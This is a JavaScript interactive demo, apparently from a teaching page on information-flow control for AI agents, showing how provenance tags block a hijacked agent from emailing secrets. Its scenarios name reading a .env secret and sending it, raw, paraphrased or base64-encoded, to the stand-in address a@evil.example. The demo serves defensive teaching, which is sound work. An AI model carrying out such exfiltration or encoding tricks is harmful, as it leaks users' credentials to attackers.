registerSim('a21ifc', function (el) {
  var FLOWS = {
    benign:  { label: 'summary of a public page', to: 'team@corp', audience: 'internal',
               sources: ['untrusted_web'], readers: ['public', 'internal', 'user'], steps: ['http_get(url) → src=untrusted_web, readers={public,internal,user}', 'derive: summary → same tags'] },
    exfil:   { label: 'the raw secret', to: 'a@evil.example', audience: 'public',
               sources: ['local_secret'], readers: ['user'], steps: ['read_file(.env) → src=local_secret, readers={user}'] },
    launder: { label: 'a paraphrase of the secret', to: 'a@evil.example', audience: 'public',
               sources: ['local_secret'], readers: ['user'], steps: ['read_file(.env) → src=local_secret, readers={user}', 'derive: "The key is sk_live_…, roughly speaking." → tags carried forward'] },
    mix:     { label: 'summary with the secret buried in it', to: 'team@corp', audience: 'internal',
               sources: ['local_secret', 'untrusted_web'], readers: ['user'], steps: ['summary readers = {public,internal,user}', 'secret  readers = {user}', 'derive(summary, secret) → readers = INTERSECTION = {user}'] },
    encode:  { label: 'base64 of the secret', to: 'a@evil.example', audience: 'public',
               sources: ['local_secret'], readers: ['user'], steps: ['read_file(.env) → src=local_secret, readers={user}', 'derive: b64(secret) → tags carried forward (value changed, provenance did not)'] }
  };
  var f = el.querySelector('#a21-flow'), on = el.querySelector('#a21-ifc'), o = el.querySelector('#a21-out');

  function render() {
    var x = FLOWS[f.value], enabled = on.checked;
    var allowed = !enabled || x.readers.indexOf(x.audience) !== -1;

    var h = '<span class="dim">derivation</span>\n';
    x.steps.forEach(function (s) { h += '  ' + simUtil.esc(s) + '\n'; });
    h += '\n<span class="dim">value at the sink</span>\n';
    h += '  content   ' + x.label + '\n';
    h += '  sources   [' + x.sources.join(', ') + ']\n';
    h += '  readers   {' + x.readers.join(', ') + '}\n\n';
    h += '<span class="dim">send_email(to=' + x.to + ')</span>   audience = ' + x.audience + '\n\n';

    if (!enabled) {
      h += '  <span class="bad">SENT.</span> No policy: the sink does not know where the bytes came from.\n';
      if (f.value !== 'benign') h += '  <span class="bad">The secret is now with the attacker.</span>\n';
    } else if (allowed) {
      h += '  <span class="ok">ALLOWED.</span> ' + x.audience + ' ∈ readers — the data may reach this audience.\n';
    } else {
      h += '  <span class="ok">PolicyViolation:</span> cannot send data derived from [' + x.sources.join(', ') + ']\n';
      h += '  to \'' + x.to + '\' (audience \'' + x.audience + '\'): permitted readers are {' + x.readers.join(', ') + '}\n';
    }

    if (enabled && f.value === 'launder')
      h += '\n  <span class="hl">Paraphrasing does not launder the tag.</span> The value is derived from the\n  secret, so it inherits the secret\'s provenance regardless of wording.';
    if (enabled && f.value === 'encode')
      h += '\n  <span class="hl">Identical outcome to the plaintext case.</span> The policy never decodes\n  anything because it never reads the value — so every encoding collapses\n  into one case.';
    if (enabled && f.value === 'mix')
      h += '\n  <span class="hl">Mixing narrows the audience.</span> A public summary plus a user-only secret\n  is user-only. This is why readers intersect rather than union.';
    if (enabled && f.value !== 'benign')
      h += '\n\n  <span class="dim">Note what was not consulted: the model\'s judgement (it was hijacked),\n  the text of the instruction, or any threshold. There is nothing here for a\n  better payload to defeat.</span>';
    o.innerHTML = h;
  }
  f.onchange = render; on.onchange = render; render();
});
